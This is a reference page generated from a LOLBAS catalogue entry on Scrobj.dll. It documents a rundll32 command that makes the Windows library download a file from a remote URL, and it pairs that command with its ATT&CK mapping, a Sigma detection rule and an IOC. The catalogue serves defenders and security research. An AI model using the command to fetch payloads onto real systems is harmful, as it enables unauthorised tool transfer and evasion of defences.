---
title: "Scrobj.dll"
framework: "lolbas"
generated: "true"
source_path: "yml/OSLibraries/Scrobj.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Scrobj.yml"
build_date: "2026-04-27 19:14:21"
category: "OSLibraries"
aliases:
  - "Scrobj.dll"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Windows Script Component Runtime

## Paths

- `c:\windows\system32\scrobj.dll`
- `c:\windows\syswow64\scrobj.dll`

## Commands

### 1. Download

Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.

```cmd
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
```

- Use Case: Download file from remote location.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line

## Resources

- {'Link': 'https://twitter.com/eral4m/status/1479106975967240209'}

## Acknowledgements

- {'Person': 'Eral4m', 'Handle': '@eral4m'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Scrobj.yml)
